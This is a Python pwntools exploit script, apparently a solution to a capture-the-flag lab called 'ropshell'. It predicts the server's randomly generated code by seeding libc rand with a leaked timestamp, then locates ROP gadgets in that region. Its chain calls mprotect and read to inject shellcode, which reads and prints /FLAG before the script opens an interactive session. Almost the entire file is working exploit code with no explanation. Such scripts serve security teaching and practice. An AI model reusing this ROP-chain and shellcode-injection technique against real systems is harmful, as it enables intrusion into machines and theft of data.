#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import pow as pw
import time
from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')

LEN_CODE = 10*0x10000
LEN_STACK = 8192
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
MAP_PRIVATE = 0x2
MAP_ANONYMOUS = 0x20
NULL = 0

# Define mmap function
mmap = libc.mmap
mmap.restype = ctypes.c_void_p
mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_longlong]

# Define memset function
memset = libc.memset
memset.restype = ctypes.c_void_p
memset.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_size_t]

# Define time function
time_func = libc.time
time_func.restype = ctypes.c_long
time_func.argtypes = [ctypes.POINTER(ctypes.c_long)]

# Define srand function
srand = libc.srand
srand.argtypes = [ctypes.c_uint]

# Define rand function
rand = libc.rand
rand.restype = ctypes.c_int

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

r.recv()
timestamp = r.recvuntil(b'\n').decode().split()[3]
print('timestamp:', timestamp)
code_base = int(r.recvuntil(b'\n').decode().split()[5], base=16)
print('base:', hex(code_base))

# Call mmap function to allocate memory for code
code = mmap(code_base, LEN_CODE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)

# Cast code pointer to uint32_t pointer
codeint = ctypes.cast(code, ctypes.POINTER(ctypes.c_uint32))

# Call srand function to seed random number generator
srand(int(timestamp))

# Generate random code
for i in range(LEN_CODE // 4):
    codeint[i] = (rand() << 16) | (rand() & 0xffff)

# Set a random instruction to be the exit instruction
codeint[rand() % (LEN_CODE // 4 - 1)] = 0xc3050f

rax = asm("pop rax; ret")        
rdx = asm("pop rdx; ret")
rdi = asm("pop rdi; ret")
rsi = asm("pop rsi; ret")
syscall = asm("syscall; ret")
              
print('-------------------')

# convert code to bytes
codebyte = ctypes.cast(code, ctypes.POINTER(ctypes.c_ubyte))
rax_addr, rdi_addr, rsi_addr, rdx_addr, syscall_addr = None, None, None, None, None

# find pop rax
for i in range(LEN_CODE - len(rax)):
    if bytes(codebyte[i:i+len(rax)]) == rax:
        rax_addr = i + code_base
        print(f"rax found at offset {hex(rax_addr)}")
        break
# print('-------------------')

# find pop rdx
for i in range(LEN_CODE - len(rdx)):
    if bytes(codebyte[i:i+len(rdx)]) == rdx:
        rdx_addr = i + code_base
        print(f"rdx found at offset {hex(rdx_addr)}")
        break
# print('-------------------')

# find pop rdi
for i in range(LEN_CODE - len(rdi)):
    if bytes(codebyte[i:i+len(rdi)]) == rdi:
        rdi_addr = i + code_base
        print(f"rdi found at offset {hex(rdi_addr)}")
        break
# print('-------------------')

# find pop rsi
for i in range(LEN_CODE - len(rsi)):
    if bytes(codebyte[i:i+len(rsi)]) == rsi:
        rsi_addr = i + code_base
        print(f"rsi found at offset {hex(rsi_addr)}")
        break
# print('-------------------')

# find syscall
for i in range(LEN_CODE - len(syscall)):
    if bytes(codebyte[i:i+len(syscall)]) == syscall:
        syscall_addr = i + code_base
        print(f"syscall found at offset {hex(syscall_addr)}")
        break
print('-------------------')

# shellcode
shellcode = asm(f"""
    mov rax, 2
    mov rdi, {code_base}
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, {code_base + 1000}
    mov rdx, 100
    syscall
    
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, {code_base + 1000}
    syscall

    mov rax, 60
    mov rdi, 37
    syscall
""")
shellcode = b'/FLAG\0' + shellcode
# print("shellcode:", shellcode, ", len:", len(shellcode))

# payload
payload = b''

# mprotect: modify the permission of code
payload += p64(rax_addr)
payload += p64(10)
payload += p64(rdi_addr)
payload += p64(code_base)
payload += p64(rsi_addr)
payload += p64(LEN_CODE)
payload += p64(rdx_addr)
payload += p64(PROT_READ | PROT_WRITE | PROT_EXEC)
payload += p64(syscall_addr)

# read: write the sheelcode to code
payload += p64(rax_addr)
payload += p64(0)
payload += p64(rdi_addr)
payload += p64(0)
payload += p64(rsi_addr)
payload += p64(code_base)
payload += p64(rdx_addr)
payload += p64(len(shellcode))
payload += p64(syscall_addr)

# jump to the address where shellcode stored
payload += p64(code_base + 6)

r.send(payload)

# wait for a while and send shellcode
time.sleep(1)
r.send(shellcode)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
